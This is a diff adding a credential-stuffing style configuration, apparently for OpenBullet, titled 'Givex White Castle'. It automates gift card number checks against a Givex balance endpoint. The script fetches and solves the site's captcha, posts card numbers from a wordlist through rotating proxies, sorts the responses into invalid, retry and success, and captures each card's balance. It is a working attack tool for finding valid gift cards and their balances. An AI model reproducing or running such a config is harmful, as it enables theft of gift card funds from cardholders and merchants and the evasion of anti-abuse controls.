@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "Givex White Castle",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-03T14:16:20.4765998+00:00",
+  "AdditionalInfo": "Care cause givex captchas are CASE SENSITIVE and not all workers do that",
+  "Author": "Tunacan",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 1,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_FOR_CAPTCHA REQUEST GET "https://wwws-usa2.givex.com/public/balance/balancecheck.py?3626+_LANGUAGE_:en+merchant_id:3626" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://wwws-usa2.givex.com/public/balance/balancecheck.py?3626+_LANGUAGE_:en" 
+#PARSE_CAPTCHA_ID PARSE "<SOURCE>" LR "<IMG SRC=\"securebmpr.py?" "\"" Recursive=FALSE -> VAR "CAPTCHAID" "" "" 
+CAPTCHA "https://wwws-usa2.givex.com/public/balance/securebmpr.py?<CAPTCHAID>" Base64=FALSE SendScreenshot=FALSE -> VAR "CAPTCHA" 
+#CHECK_BALANCE REQUEST POST "https://wwws-usa2.givex.com/public/balance/balancecheck.py?3626+_LANGUAGE_:en" AutoRedirect=TRUE 
+  CONTENT "cardnum=<USER>&_LANGUAGE_=en&_FUNCTION_=result&webinfo_id=<CAPTCHAID>&merchant_id=3626&partner_id=1&code=<CAPTCHA>&%23&x=48&y=2" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://wwws-usa2.givex.com/public/balance/balancecheck.py?3626" 
+  HEADER "origin: https://wwws-usa2.givex.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Card number is invalid" 
+  KEYCHAIN Retry OR 
+    KEY "Sorry! The validation field entry does not match the letters contained in the bitmap image" 
+  KEYCHAIN Success OR 
+    KEY "The balance for card" 
+#CAPTURE_BALANCE PARSE "<SOURCE>" LR "<FONT SIZE=\"3\" FACE=\"arial\" COLOR=\"#ff6633\"><B> " " </B></FONT>" Recursive=FALSE -> CAP "Balance" "" "" 
